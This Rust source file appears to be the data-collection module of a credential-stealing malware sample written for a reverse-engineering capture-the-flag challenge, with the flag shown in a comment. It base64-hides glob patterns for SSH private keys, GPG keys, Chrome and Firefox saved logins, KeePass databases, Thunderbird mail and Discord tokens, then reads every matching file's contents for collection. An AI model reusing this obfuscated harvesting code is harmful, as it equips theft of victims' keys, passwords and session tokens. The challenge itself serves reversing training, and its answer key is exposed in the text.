/* File containing all the functions used to retrieve information from the system
Based on the chosen OS, different functions will be compiled into the binary*/
use base64::{engine::general_purpose, Engine as _};
use glob::glob;
use std::collections::HashMap;
use std::str;
extern crate file;

#[cfg(feature = "linux")]
pub fn get_info() -> HashMap<String, String> {
    let mut infos: HashMap<String, String> = HashMap::new();
    let decoded = general_purpose::STANDARD_NO_PAD.decode("L2hvbWUvKi8uKnNzaC9pZF8qfC9ob21lLyovLipnbnVwZy8qLmdwZ3wvaG9tZS8qLy4qdGh1bmRlcmJpcmQvKi5zYmQvKi5tc2Z8L2hvbWUvKi8uKmNvbmZpZy9nb29nbGUtY2hyb21lL0RlZmF1bHQvTG9naW4gRGF0YXwvaG9tZS8qLy4qbW96aWxsYS9maXJlZm94LyouZGVmYXVsdCovbG9naW5zLmpzb258L2hvbWUvKi8uKmtlZXBhc3MqLyoqLyoua2RieHwvaG9tZS8qLy4qa2VlcGFzcyovKiovKi5rZGJ8L2hvbWUvKi8uKmNvbmZpZy9kaXNjb3JkL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYi8qLmxkYgo").unwrap();
    let decoded2 = general_purpose::STANDARD_NO_PAD
        .decode("ZmxhZ192YWx1ZQ")
        .unwrap();
    let decoded3 = general_purpose::STANDARD_NO_PAD
        .decode("TTRMVzRSM181VUNDMzVGVUxMWV9SM1YzUjUzRA")
        .unwrap(); // flag : M4LW4R3_5UCC35FULLY_R3V3R53D
    for p in str::from_utf8(&decoded).unwrap().split("|") {
        // paths are separated by the character "|" and then base64'd
        if let Some(info) = get_files_from_glob_path(p) {
            if !info.eq("") {
                // remove empty results
                infos.insert(String::from(p), info.clone());
            }
        }
        infos.insert(
            String::from(str::from_utf8(&decoded2).unwrap()),
            String::from(str::from_utf8(&decoded3).unwrap()),
        ); // ajout du flag
    }
    infos
}

#[cfg(feature = "windows")]
pub fn get_info() -> HashMap<String, String> {
    let mut infos: HashMap<String, String> = HashMap::new();
    let decoded = general_purpose::STANDARD_NO_PAD.decode("QzovVXNlcnMvKi8uKnNzaC9pZF98QzovVXNlcnMvKi8uKmdudXBnLyouZ3BnfEM6L1VzZXJzLyovLip0aHVuZGVyYmlyZC8qLnNiZC8qLm1zZnxDOi9Vc2Vycy8qLy4qY29uZmlnL2dvb2dsZS1jaHJvbWUvRGVmYXVsdC9Mb2dpbiBEYXRhfEM6L1VzZXJzLyovLiptb3ppbGxhL2ZpcmVmb3gvKi5kZWZhdWx0Ki9sb2dpbnMuanNvbnxDOi9Vc2Vycy8qLy4qa2VlcGFzcyovKiovKi5rZGJ4fEM6L1VzZXJzLyovLiprZWVwYXNzKi8qKi8qLmtkYnxDOi9Vc2Vycy8qLy4qY29uZmlnL2Rpc2NvcmQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiLyoubGRiCg").unwrap();
    let decoded2 = general_purpose::STANDARD_NO_PAD
        .decode("ZmxhZ192YWx1ZQ")
        .unwrap();
    let decoded3 = general_purpose::STANDARD_NO_PAD
        .decode("TTRMVzRSM181VUNDMzVGVUxMWV9SM1YzUjUzRA")
        .unwrap(); // flag : M4LW4R3_5UCC35FULLY_R3V3R53D
    for p in str::from_utf8(&decoded).unwrap().split("|") {
        // paths are separated by the character "|" and then base64'd
        if let Some(info) = get_files_from_glob_path(p) {
            if !info.eq("") {
                // remove empty results
                infos.insert(String::from(p), info.clone());
            }
        }
        infos.insert(
            String::from(str::from_utf8(&decoded2).unwrap()),
            String::from(str::from_utf8(&decoded3).unwrap()),
        ); // ajout du flag
    }
    infos
}

/* Generic function retrieving the contents of all files matching a specified input  */
fn get_files_from_glob_path(glob_path: &str) -> Option<String> {
    let mut result: String = String::from("");
    if let Ok(glob) = glob(&glob_path) {
        for entry in glob {
            match entry {
                Ok(path) => {
                    // file matching id_*
                    if let Ok(s) = file::get_text(&path) {
                        result.push_str(path.as_os_str().to_str().unwrap_or_else(|| "file:"));
                        result.push_str(" ");
                        result.push_str(&s);
                    }
                }
                Err(_) => (), // other files
            }
        }
        return Some(result);
    }
    return None;
}
